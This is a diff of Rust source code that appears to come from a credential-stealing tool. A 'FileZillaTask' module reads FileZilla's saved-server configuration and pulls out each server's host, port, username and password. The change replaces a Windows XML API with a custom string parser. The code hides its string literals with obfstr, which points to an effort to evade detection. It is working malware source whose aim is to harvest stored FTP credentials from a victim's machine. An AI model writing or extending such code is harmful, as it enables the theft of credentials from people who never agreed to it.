@@ -35,8 +35,6 @@ use filesystem::{FileSystem, WriteTo};
 use obfstr::obfstr as s;
 use tasks::Task;
 use utils::base64::base64_decode;
-use windows::Data::Xml::Dom::XmlDocument;
-use windows::core::HSTRING;
 
 pub struct FileZillaTask;
 
@@ -127,43 +125,8 @@ where
 
     let bytes = bytes.ok()?;
     let content = String::from_utf8(bytes).ok()?;
-    let content = HSTRING::from(content.as_str());
 
-    let xml_doc = XmlDocument::new().ok()?;
-    xml_doc.LoadXml(&content).ok()?;
-
-    let root = xml_doc.DocumentElement().ok()?;
-    let servers = root
-        .SelectSingleNode(&HSTRING::from(servers_node.as_ref()))
-        .ok()?;
-
-    let nodes = servers.SelectNodes(&HSTRING::from(s!("Server"))).ok()?;
-
-    for i in 0..nodes.Length().ok()? {
-        let server = nodes.Item(i).ok()?;
-
-        let get_text = |name: &str| -> Option<String> {
-            if let Ok(child) = server.SelectSingleNode(&HSTRING::from(name)) {
-                Some(child.InnerText().ok()?.to_string_lossy())
-            } else {
-                Some(String::new())
-            }
-        };
-
-        let host = get_text(s!("Host"))?;
-        let port = get_text(s!("Port"))?.parse::<u16>().unwrap_or(0);
-        let user = get_text(s!("User"))?;
-        let password = get_text(s!("Pass"))?;
-
-        result.push(Server {
-            host,
-            port,
-            user,
-            password,
-        })
-    }
-
-    Some(result)
+    parse_servers(&content, servers_node.as_ref())
 }
 
 #[derive(PartialEq)]
@@ -172,4 +135,65 @@ struct Server {
     port: u16,
     user: String,
     password: String,
+}
+
+fn parse_servers(content: &str, servers_node: &str) -> Option<Vec<Server>> {
+    let section = extract_section(content, servers_node)?;
+    let mut result = Vec::new();
+
+    for block in section.split(s!("<Server")).skip(1) {
+        let remainder = if let Some((_, rest)) = block.split_once('>') {
+            rest
+        } else {
+            continue;
+        };
+
+        let body = if let Some((body, _)) = remainder.split_once(s!("</Server>")) {
+            body
+        } else {
+            continue;
+        };
+
+        let host = extract_field(body, s!("Host"));
+        let port = extract_field(body, s!("Port"))
+            .parse::<u16>()
+            .unwrap_or(0);
+        let user = extract_field(body, s!("User"));
+        let password = extract_field(body, s!("Pass"));
+
+        result.push(Server {
+            host,
+            port,
+            user,
+            password,
+        });
+    }
+
+    Some(result)
+}
+
+fn extract_section<'a>(content: &'a str, node: &str) -> Option<&'a str> {
+    let open_tag = format!("<{}>", node);
+    let close_tag = format!("</{}>", node);
+
+    let start = content.find(&open_tag)? + open_tag.len();
+    let rest = &content[start..];
+    let end = rest.find(&close_tag)?;
+
+    Some(&rest[..end])
+}
+
+fn extract_field(content: &str, name: &str) -> String {
+    let open_tag = format!("<{}>", name);
+    let close_tag = format!("</{}>", name);
+
+    if let Some(start) = content.find(&open_tag) {
+        let start_idx = start + open_tag.len();
+        if let Some(end_rel) = content[start_idx..].find(&close_tag) {
+            let value = &content[start_idx..start_idx + end_rel];
+            return value.trim().to_string();
+        }
+    }
+
+    String::new()
 }
